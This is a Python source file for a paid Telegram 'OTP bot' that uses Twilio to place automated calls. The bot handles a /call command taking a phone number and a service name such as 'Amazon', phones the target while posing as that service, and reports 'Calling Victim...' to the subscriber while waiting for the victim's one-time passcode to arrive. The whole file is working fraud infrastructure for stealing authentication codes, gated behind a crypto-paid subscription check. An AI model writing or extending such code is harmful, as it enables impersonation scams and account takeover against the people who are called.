from telebot.types import Message
from twilio.rest import Client
from datetime import datetime
from config import bot, TWILIO_SID, TWILIO_TOKEN, TWILIO_NUMBER, TWILIO_APP_URL
from database import get_connection

# Inicializar Twilio
twilio_client = None
if TWILIO_SID and TWILIO_TOKEN:
    try: twilio_client = Client(TWILIO_SID, TWILIO_TOKEN)
    except: pass

def check_subscription(user_id):
    """Verifica si el usuario tiene tiempo de suscripción activo."""
    conn = get_connection()
    if not conn: return False
    
    try:
        cur = conn.cursor()
        cur.execute("SELECT subscription_end FROM otp_users WHERE user_id = %s", (user_id,))
        result = cur.fetchone()
        cur.close()
        conn.close()
        
        if result and result[0]:
            # Si la fecha de fin es mayor a AHORA, tiene acceso
            return result[0] > datetime.now()
        return False
    except Exception as e:
        print(f"Error checking sub: {e}")
        return False

@bot.message_handler(commands=['call'])
def handle_call(message: Message):
    user_id = message.chat.id
    
    # 1. VERIFICAR SUSCRIPCIÓN (SEGURIDAD)
    if not check_subscription(user_id):
        bot.reply_to(message, "⛔ **Access Denied**\n\nYou need an active subscription to make calls.\nPlease buy a plan using /start -> ₿uy Plan.", parse_mode="Markdown")
        return

    # 2. VERIFICAR TWILIO
    if not twilio_client: 
        return bot.reply_to(message, "❌ Twilio not configured in system.")
    
    # 3. VERIFICAR FORMATO
    args = message.text.split()
    if len(args) < 3: 
        return bot.reply_to(message, "⚠️ **Usage:** `/call +15550000 Amazon`", parse_mode="Markdown")
    
    target = args[1]
    service = " ".join(args[2:])
    
    # 4. HACER LA LLAMADA
    try:
        bot.reply_to(message, f"🔄 Connecting to **{service}**...", parse_mode="Markdown")
        
        twiml_url = f"{TWILIO_APP_URL}/twilio/voice?service={service}&user_id={user_id}"
        
        call = twilio_client.calls.create(
            to=target, 
            from_=TWILIO_NUMBER, 
            url=twiml_url, 
            method='POST',
            status_callback=f"{TWILIO_APP_URL}/twilio/gather", # Para rastrear estado
            status_callback_event=['completed']
        )
        
        bot.send_message(user_id, f"📞 **Calling Victim...**\nTarget: `{target}`\nSID: `{call.sid}`\n\n_Wait for the OTP code to appear here..._", parse_mode="Markdown")
        
    except Exception as e:
        error_msg = str(e)
        if "unverified" in error_msg.lower():
            bot.reply_to(message, "❌ **Twilio Error:** En modo prueba solo puedes llamar a números verificados.")
        else:
            bot.reply_to(message, f"❌ **Error:** {error_msg}")
